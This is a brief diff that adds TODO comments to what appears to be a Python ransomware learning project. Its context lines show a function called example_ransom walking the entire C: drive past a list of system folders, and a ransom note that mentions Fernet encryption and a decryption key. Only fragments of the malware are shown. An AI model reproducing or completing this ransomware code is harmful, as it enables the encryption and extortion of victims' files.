@@ -4,6 +4,7 @@ from .Utils import encrypt,key,encryptor
 IGNORE_LIST = {'windows', 'python', 'microsoft', 'system'}
 
 def parse_dir(root, folder):
+    """# //TODO: add doc for this whole thing"""
     try:
         msg = f"""  this is a learning project only. if by any case you got injured by this
                         im really sorry, use the key {key} to decrypt, i used fernet in python. {encryptor}.\n'
@@ -28,6 +29,7 @@ def parse_dir(root, folder):
 
 
 def example_ransom():
+    # //TODO: add doc for this whole thing
     for r, d, f in os.walk('c:/'):
         for directory in d:
             if directory.lower() in IGNORE_LIST:
